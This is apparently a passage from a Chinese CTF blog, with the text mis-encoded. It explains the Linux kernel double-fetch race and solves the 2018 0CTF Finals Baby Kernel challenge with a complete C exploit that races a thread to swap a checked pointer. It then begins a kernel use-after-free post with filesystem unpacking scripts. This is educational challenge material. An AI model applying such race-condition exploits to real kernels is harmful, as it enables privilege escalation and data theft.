<p>ä¸€ä¸ªå…¸å‹çš„ <code>Double Fetch</code> æ¼æ´åŸç†å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¸€ä¸ªç”¨æˆ·æ€çº¿ç¨‹å‡†å¤‡æ•°æ®å¹¶é€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸ï¼Œè¯¥æ•°æ®åœ¨å†…æ ¸ä¸­æœ‰ä¸¤æ¬¡è¢«å–ç”¨ï¼Œå†…æ ¸ç¬¬ä¸€æ¬¡å–ç”¨æ•°æ®è¿›è¡Œå®‰å…¨æ£€æŸ¥ï¼ˆå¦‚ç¼“å†²åŒºå¤§å°ã€æŒ‡é’ˆå¯ç”¨æ€§ç­‰ï¼‰ï¼Œå½“æ£€æŸ¥é€šè¿‡åå†…æ ¸ç¬¬äºŒæ¬¡å–ç”¨æ•°æ®è¿›è¡Œå®é™…å¤„ç†ã€‚è€Œåœ¨ä¸¤æ¬¡å–ç”¨æ•°æ®ä¹‹é—´ï¼Œå¦ä¸€ä¸ªç”¨æˆ·æ€çº¿ç¨‹å¯åˆ›é€ æ¡ä»¶ç«äº‰ï¼Œå¯¹å·²é€šè¿‡æ£€æŸ¥çš„ç”¨æˆ·æ€æ•°æ®è¿›è¡Œç¯¡æ”¹ï¼Œåœ¨çœŸå®ä½¿ç”¨æ—¶é€ æˆè®¿é—®è¶Šç•Œæˆ–ç¼“å†²åŒºæº¢å‡ºï¼Œæœ€ç»ˆå¯¼è‡´å†…æ ¸å´©æºƒæˆ–æƒé™æå‡ã€‚</p>
</blockquote>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041615674.png" alt="image-20230404161502570" style="zoom:50%;" />

<p>å› ä¸º <code>CTF wiki</code> ä¸Šè¿™é‡Œæ€»ç»“çš„éå¸¸å¥½ï¼ˆå»ºè®®åå¤é˜…è¯» QAQ ï¼‰ï¼Œå³ä½¿å†å™è¿°ä¸€éä¹Ÿæ„Ÿè§‰æ„ä¹‰ä¸å¤§ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è¿›è¡Œäº†å¼•ç”¨</p>
<p>åŸæ–‡é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/">Double Fetch - CTF Wiki (ctf-wiki.org)</a></p>
<h3 id="2018-0CTF-Finals-Baby-Kernel"><a href="#2018-0CTF-Finals-Baby-Kernel" class="headerlink" title="2018 0CTF Finals Baby Kernel"></a>2018 0CTF Finals Baby Kernel</h3><p>é¢˜ç›®é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://github.com/cc-sir/ctf-challenge/tree/master/2018%200CTF%20Finals%20Baby%20Kernel">https://github.com/cc-sir/ctf-challenge/tree/master/2018%200CTF%20Finals%20Baby%20Kernel</a></p>
<h4 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h4><h5 id="SMAP-x2F-SMEP"><a href="#SMAP-x2F-SMEP" class="headerlink" title="SMAP&#x2F;SMEP"></a>SMAP&#x2F;SMEP</h5><p><code>SMAP</code> å³<code>ç®¡ç†æ¨¡å¼è®¿é—®ä¿æŠ¤</code>ï¼ˆSupervisor Mode Access Preventionï¼‰ï¼Œå½“å¼€å¯è¿™ä¸ªä¿æŠ¤åï¼Œåœ¨å†…æ ¸æ¨¡å¼ä¸‹æ— è®ºæ˜¯å†™å…¥æˆ–è€…è¯»å–ç”¨æˆ·æ¨¡å¼ä¸‹çš„æ•°æ®éƒ½ä¼šé€ æˆå†…å­˜å¼‚å¸¸ã€‚<code>SMEP</code> ï¼ˆSupervisor Mode Execution Preventionï¼‰åˆ™æ˜¯ <code>ç®¡ç†æ¨¡å¼æ‰§è¡Œä¿æŠ¤</code>ï¼Œé˜»æ­¢å†…æ ¸ç©ºé—´ä¸­æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„æ•°æ®ã€‚</p>
<h5 id="å¯åŠ¨æ–‡ä»¶çš„è®¾ç½®"><a href="#å¯åŠ¨æ–‡ä»¶çš„è®¾ç½®" class="headerlink" title="å¯åŠ¨æ–‡ä»¶çš„è®¾ç½®"></a>å¯åŠ¨æ–‡ä»¶çš„è®¾ç½®</h5><p><code>lsmod</code> å‘½ä»¤æŸ¥çœ‹æ¨¡å—åŸºåœ°å€ä¸º <code>0</code> ï¼Œéœ€è¦æœ¬åœ°è°ƒè¯•çš„æ—¶å€™ä¿®æ”¹ <code>init</code> æ–‡ä»¶ï¼ˆæ”¹å®Œä¹‹åï¼Œå†å°†æ–‡ä»¶ç³»ç»Ÿæ‰“åŒ…ï¼‰ï¼Œå°†åŸæœ¬çš„ <code>setsid cttyhack setuidgid 1000 sh</code> æ”¹ä¸º <code>setsid cttyhack setuidgid 0 sh</code> å³å¯ã€‚</p>
<p>å…³é—­ <code>kaslr</code> çš„è¯ï¼Œåœ¨ <code>start.sh</code> æ–‡ä»¶çš„æ­¤å¤„åŠ ä¸Š <code>nokaslr</code> å³å¯ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303292040104.png" alt="image-20230329204004810"></p>
<p>å†…æ ¸ä¸­ä»¥ <code>printk</code> è¾“å‡ºçš„å†…å®¹ï¼Œå¯ä»¥é€šè¿‡ <code>dmesg</code> å‘½ä»¤æŸ¥çœ‹ã€‚å‰ææ˜¯éœ€è¦å…³é—­ <code>dmesg_restrict</code> ï¼Œå¦åˆ™æ— æ³•æŸ¥çœ‹ <code>printk</code> ä¿¡æ¯ï¼Œå…³é—­æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br></pre></td></tr></table></figure>

<p>ç³»ç»Ÿå†…æ ¸å‚æ•° <code>kernel.dmesg_restrict</code> ç”¨äºæ§åˆ¶æ™®é€šç”¨æˆ·æ˜¯å¦å¯ä»¥æŸ¥çœ‹å†…æ ¸æ—¥å¿— <code>dmesg</code>ã€‚å½“è¯¥å‚æ•°å€¼ä¸º1æ—¶ï¼Œåªæœ‰ <code>root</code> ç”¨æˆ·æ‰èƒ½æŸ¥çœ‹å†…æ ¸æ—¥å¿—ï¼Œè€Œæ™®é€šç”¨æˆ·åˆ™æ— æ³•æŸ¥çœ‹ã€‚è€Œå°†è¯¥å‚æ•°å€¼è®¾ç½®ä¸º0ï¼Œå…è®¸æ™®é€šç”¨æˆ·æŸ¥çœ‹å†…æ ¸æ—¥å¿—ã€‚</p>
<p><strong>æ³¨æ„ï¼šæœ¬é¢˜ç”±äºä»å†…æ ¸ä¸­è®¿é—®äº†ç”¨æˆ·æ€çš„æ•°æ®ï¼Œæ‰€ä»¥è¦å…³é—­ <code>SMAP</code> ä¿æŠ¤ï¼Œå¦åˆ™ä¼šå¯¼è‡´ <code>kernel panic</code></strong></p>
<h4 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h4><p>å½“ <code>a2</code> ä¸º <code>0x1337</code> ä¼šåšä¸‰ä¸ªæ£€æŸ¥</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304031554946.png" alt="image-20230403155425780"></p>
<p>å‘ç°ç¬¬ä¸€ä¸ª <code>_chk_range_not_ok</code> å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ <code>(&amp;current_task) + 0x1358</code> ï¼Œè¿™ä¸ªä½ç½®æ˜¯ <code>stack pointer</code> å­—æ®µï¼Œè®°å½•äº†æ ˆåŒºçš„ç»“æŸåœ°å€ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·ç©ºé—´çš„æœ€å¤§èŒƒå›´ã€‚é€šè¿‡è°ƒè¯•ä¹Ÿå¯ä»¥å°è¯ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304031742899.png" alt="image-20230403174212778"></p>
<p><code>_chk_range_not_ok</code> å‡½æ•°æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°åŠ ç¬¬äºŒä¸ªå‚æ•°å¤§äºç¬¬ä¸‰ä¸ªå‚æ•°çš„æƒ…å†µä¸‹è¿”å› <code>True</code>  ï¼Œä½†è¯¥å‡½æ•°çš„å¤–é¢è¿˜æœ‰ä¸€ä¸ª <code>!</code> ï¼Œæ‰€ä»¥è¿™é‡Œçš„æƒ³è¿‡ <code>if</code> çš„è¯ï¼Œéœ€è¦æ»¡è¶³ç¬¬ä¸€ä¸ªå‚æ•°åŠ ç¬¬äºŒä¸ªå‚æ•°å°äºç¬¬ä¸‰ä¸ªå‚æ•°</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304032107333.png" alt="image-20230403210735151" style="zoom:67%;" />



<p>è¿™é‡Œå‡ºç°äº†ä¸€ä¸ª <code>*(_QWORD *)v5</code> å’Œ <code>*(int *)(v5+8)</code> ï¼Œè¿™ä¸ªæ ¼å¼å¯ä»¥æ¨æ–­å‡ºæ¥ä»–ä»¬æ˜¯ç»“æ„ä½“ä¸­çš„æˆå‘˜å˜é‡ï¼Œå› ä¸ºæ‹¿ <code>*(_DWORD)(v5+8)</code> å»å’Œ <code>flag</code> çš„é•¿åº¦åšäº†æ¯”è¾ƒï¼Œå¯ä»¥çŒœæµ‹ <code>*(_DORD)(v5+8)</code> æ˜¯ æˆ‘ä»¬è¾“å…¥<code>flag</code> å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç»“åˆå‰é¢åˆ†æ <code>_chk_range_not_ok</code> å‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ç”¨æˆ·ç©ºé—´çš„æœ€å¤§èŒƒå›´ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯æŸä¸ªå€¼åŠ ä¸Šè¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè¦å°äºç”¨æˆ·åŒºçš„æœ€å¤§èŒƒå›´ï¼Œå› æ­¤æ¨æ–­è¿™ä¸ªå€¼åº”è¯¥æ˜¯æˆ‘ä»¬è¾“å…¥ <code>flag</code> çš„èµ·å§‹åœ°å€</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304032113941.png" alt="image-20230403211351891"></p>
<p>æ‰€ä»¥åˆ›å»ºä¸€ä¸ªç»“æ„ä½“ï¼Œæ­¤æ—¶çš„ä»£ç å¦‚ä¸‹</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040927250.png" alt="image-20230404092707055"></p>
<p>æŸ¥çœ‹ä¸‹é¢çš„ä»£ç çŸ¥é“ <code>v2</code> å°±æ˜¯ <code>rdx</code> ï¼Œä¹Ÿå°±æ˜¯ <code>baby_ioctl</code> å‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œåæ¥å°†è¿™ä¸ªå‚æ•°èµ‹å€¼ä¸º <code>v5</code> ï¼Œå› æ­¤åœ¨ç”¨æˆ·æ¨¡å¼è°ƒç”¨ <code>baby_ioctl</code> å‡½æ•°æ—¶ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¼ å…¥æå‰å†™å¥½çš„ç»“æ„ä½“çš„æŒ‡é’ˆå³å¯ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040928159.png" alt="image-20230404092839113"></p>
<p>æœ€åå®Œæ•´çš„åˆ†æä¸€é <code>baby_ioctl</code> å‡½æ•°ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040933400.png" alt="image-20230404093312297"></p>
<p>åœ¨è°ƒç”¨ <code>ioctl</code> çš„æ—¶å€™ï¼Œç¬¬äºŒä¸ªå‚æ•°å¦‚æœä¸º <code>0x6666</code> åˆ™ä¼šæ³„éœ²å‡ºå†…æ ¸ä¸­å­˜æ”¾ <code>flag</code> çš„åœ°å€ã€‚</p>
<p>å¦‚æœç¬¬äºŒä¸ªå‚æ•°ä¸º <code>0x1337</code> å¹¶ä¸”ç¬¬ä¸‰ä¸ªå‚æ•°åŠ ä¸Š <code>0x10</code> å°äºç”¨æˆ·åŒºçš„æœ€å¤§ç©ºé—´å¹¶ä¸”ç¬¬ä¸‰ä¸ªå‚æ•°åŠ ä¸Šå­—ç¬¦ä¸²çš„é•¿åº¦å°äºç”¨æˆ·åŒºçš„æœ€å¤§ç©ºé—´å¹¶ä¸”å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆè¿™ä¸ªé•¿åº¦å¹¶éçœŸçš„æ˜¯å­—ç¬¦ä¸²çš„å®é™…é•¿åº¦ï¼Œè€Œæ˜¯ç»“æ„ä½“ä¸­ <code>length</code> æˆå‘˜çš„å€¼ï¼‰è¦ç­‰äºå†…æ ¸ä¸­å­˜æ”¾çš„ <code>flag</code> é•¿åº¦ï¼Œå°±å»éå† <code>flag_addr</code> ä¸ çœŸæ­£çš„ <code>flag</code> åšå¯¹æ¯”ï¼Œå¦‚æœå®Œå…¨ä¸€æ ·åˆ™å°† <code>flag</code> è¾“å‡ºå‡ºæ¥ã€‚</p>
<h4 id="æ¼æ´äº§ç”Ÿ"><a href="#æ¼æ´äº§ç”Ÿ" class="headerlink" title="æ¼æ´äº§ç”Ÿ"></a>æ¼æ´äº§ç”Ÿ</h4><p>æ­£å¸¸åˆ†æä»£ç çš„è¯ï¼Œç¡®å®æ‰¾ä¸åˆ°æ¼æ´ã€‚è¿™ä¸ªç¨‹åºå¸Œæœ›æˆ‘ä»¬æ‹¿ç”¨æˆ·æ€ç¨‹åºä¸­çš„ <code>flag</code> å’Œå†…æ ¸ä¸­ <code>flag</code> åšå¯¹æ¯”ï¼Œåªæœ‰å®Œå…¨ä¸€æ ·æ‰è¾“å‡º <code>flag</code>ï¼Œç¨‹åºä¸“é—¨æ£€æµ‹äº†ç”¨æˆ·æ€ç¨‹åºä¸­ <code>flag</code> çš„åœ°å€æ˜¯å¦ä½äºç”¨æˆ·åŒºå†…ã€‚ç°åœ¨çš„æƒ…å†µåšæˆå›¾ç‰‡ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041028572.png" alt="image-20230404102814465"></p>
<p>æˆ‘ä»¬ä¼ å…¥ <code>ioctl</code> å‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ <code>0x601100</code> ï¼ˆåœ°å€åªæ˜¯ä¸¾ä¸ªä¾‹å­ï¼‰ä¹Ÿå°±æ˜¯ç»“æ„ä½“çš„åœ°å€ï¼Œç»“æ„ä½“ç¬¬ä¸€ä¸ªæˆå‘˜æ˜¯æŒ‡é’ˆ <code>ptr</code>ï¼Œåªæœ‰ <code>ptr</code> åœ¨ç”¨æˆ·åŒºå†…ï¼ˆä¹Ÿå°±æ˜¯ä¸º <code>flag in the user_space</code>ï¼‰æ‰èƒ½é€šè¿‡ç¬¬ä¸€ä¸ªæ£€æŸ¥ï¼Œä¸è¿‡è¿™æ ·å°±æ²¡åŠæ³•é€šè¿‡ç¬¬äºŒä¸ªæ£€æŸ¥äº†ï¼Œå› ä¸ºæˆ‘ä»¬ä¸å¯èƒ½ç¢°å·§åœ¨ç”¨æˆ·åŒºè‡ªå®šä¹‰çš„ <code>flag</code> å’Œå†…æ ¸ä¸­çš„ <code>flag</code> ä¸€æ ·ã€‚</p>
<p>å¯æ˜¯å¦‚æœæˆ‘ä»¬å¼€å¯ä¸€ä¸ªçº¿ç¨‹ï¼Œåœ¨ç¨‹åºé€šè¿‡ç¬¬ä¸€ä¸ªæ£€æŸ¥åï¼Œä¸æ–­å°† <code>ptr</code> æ”¹æˆ <code>flag in the kernel_space</code> ï¼ˆæå‰å°†å†…æ ¸ä¸­çš„ <code>flag</code> åœ°å€æ³„éœ²å‡ºæ¥ï¼‰ï¼Œè¿™æ ·åˆ°äº†ç¬¬äºŒä¸ªæ£€æŸ¥æ—¶ï¼Œç¨‹åºä¼šå°†å†…æ ¸ä¸­çš„ <code>flag</code> ä¸è‡ªå·±åšæ£€æŸ¥ï¼Œä»è€Œç»•è¿‡ç¬¬äºŒä¸ªæ£€æŸ¥ï¼Œè¾“å‡º <code>flag</code> ã€‚é—®é¢˜åœ¨äºæˆ‘ä»¬ä¸ç¡®å®šä»€ä¹ˆæ—¶å€™ç¨‹åºé€šè¿‡äº†ç¬¬ä¸€ä¸ªæ£€æŸ¥ï¼Œæ‰€ä»¥è¦å†™ä¸€ä¸ªå¾ªç¯ï¼Œä¸æ–­æ‰§è¡Œ <code>ioctl</code> ï¼ŒåŒæ—¶å¼€å¯çº¿ç¨‹ä¹Ÿä¸æ–­å¾ªç¯å»æ”¹å˜ <code>ptr</code> ï¼Œå½“ç¢°å·§ç¨‹åºé€šè¿‡äº†ç¬¬ä¸€ä¸ªæ£€æŸ¥æ—¶ï¼Œçº¿ç¨‹æ­£å¥½ä¹Ÿå°† <code>ptr</code> æ”¹å˜æˆäº† <code>flag in the kernel_space</code> ï¼Œæ­¤æ—¶å¾—åˆ° <code>flag</code> </p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc exp.c -o exp -w -static -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> true_flag_address;</span><br><span class="line"><span class="type">int</span> over=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">char</span> *flag;</span><br><span class="line">	<span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_flag</span><span class="params">(<span class="type">void</span> *a)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">info</span> *<span class="title">s</span> =</span> (<span class="keyword">struct</span> info *)a;</span><br><span class="line">    <span class="keyword">while</span> (over==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        s-&gt;flag = (<span class="type">char</span> *)true_flag_address;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;debug1 %d \n&quot;</span>,s-&gt;length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">info</span> <span class="title">flag_info</span>;</span></span><br><span class="line">    <span class="type">pthread_t</span> tt;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd1-------&gt;%d\n&quot;</span>, fd1);</span><br><span class="line">    ioctl(fd1, <span class="number">0x6666</span>, <span class="number">0x0</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; 1.txt&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;1.txt&quot;</span>, O_RDWR);</span><br><span class="line">    lseek(fd2, <span class="number">-0x1000</span>, SEEK_END);</span><br><span class="line">    read(fd2, buf, <span class="number">0x1000</span>);</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="type">char</span> *index = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (index == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not found!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;flag address ------&gt; &quot;</span>);</span><br><span class="line">        write(<span class="number">1</span>, index, <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *str = <span class="literal">NULL</span>;</span><br><span class="line">    true_flag_address = strtoull(index, &amp;str, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nflag1 true_flag_adddress ----------&gt; %llx\n&quot;</span>, true_flag_address);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> false_flag[] = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    flag_info.length = <span class="number">33</span>;</span><br><span class="line">    flag_info.flag = false_flag;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;tt, <span class="literal">NULL</span>, change_flag, &amp;flag_info);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ioctl(fd1, <span class="number">0x1337</span>, &amp;flag_info);</span><br><span class="line">        flag_info.flag = false_flag;</span><br><span class="line">    &#125;</span><br><span class="line">    over = <span class="number">1</span>;</span><br><span class="line">    pthread_join(tt, <span class="literal">NULL</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041048928.png" alt="image-20230404104852837"></p>
<h3 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h3><p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-262426.htm#msg_header_h2_8">åŸåˆ›]Linux Kernel Pwn_1_Double fetch-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com (kanxue.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/#_1">Double Fetch - CTF Wiki (ctf-wiki.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40827990/article/details/97301141?spm=1001.2014.3001.5502">(47æ¡æ¶ˆæ¯) Linux kernel Exploit å†…æ ¸æ¼æ´å­¦ä¹ (1)-Double Fetch_é’sirçš„åšå®¢-CSDNåšå®¢</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/406ce0e2.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/406ce0e2.html" class="post-title-link" itemprop="url">å…³äº kernel-UAF çš„å­¦ä¹ æ€»ç»“</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-05-15 07:36:47 / ä¿®æ”¹æ—¶é—´ï¼š08:59:14" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ æ€»ç»“</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>ç»ˆäºæ¥åˆ°äº†å…³äºå†…æ ¸çš„å­¦ä¹ ï¼Œç›®å‰æ‰“ç®—æµ…å°ä¸€ä¸‹å†…æ ¸çš„åŸºç¡€çŸ¥è¯†å’Œæ¼æ´ã€‚ä¹‹åæ¯ä¸ªå­¦ä¹ çš„æ–°æ¼æ´éƒ½å•ç‹¬å†™ä¸€ç¯‡æ–‡ç« ï¼Œæ¯ç¯‡å­¦åˆ°çš„æ–°çš„å‰ç½®çŸ¥è¯†éƒ½æ”¾åˆ°å¯¹åº”çš„æ–‡ç« ä¸­å§ï¼Œæš‚æ—¶å…ˆä¸åšæ±‡æ€»ã€‚</p>
<h3 id="CISCN2017-Pwn-babydriver"><a href="#CISCN2017-Pwn-babydriver" class="headerlink" title="CISCN2017_Pwn_babydriver"></a>CISCN2017_Pwn_babydriver</h3><h4 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h4><p>å°† <code>rootfs.cpio</code> æ–‡ä»¶ç³»ç»Ÿæ˜ åƒè§£åŒ…ï¼Œå› ä¸ºé™æ€åˆ†æéœ€è¦è§£åŒ…å¾—åˆ°çš„ <code>ko</code> æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hen rootfs.cpio</span><br></pre></td></tr></table></figure>



<p>è§£åŒ…è„šæœ¬ <code>hen</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> <span class="variable">$1</span>.gz</span><br><span class="line">unar <span class="variable">$1</span>.gz</span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> core</span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span>.gz <span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+]Successful&quot;</span></span><br></pre></td></tr></table></figure>



<p>æ‰“åŒ…è„šæœ¬ <code>gen</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span> </span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> ..</span><br></pre></td></tr></table></figure>



<p>ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œä» <code>bzImage</code> æ–‡ä»¶ä¸­æå– <code>vmlinux</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>



<h5 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gdb vmlinux</span><br></pre></td></tr></table></figure>



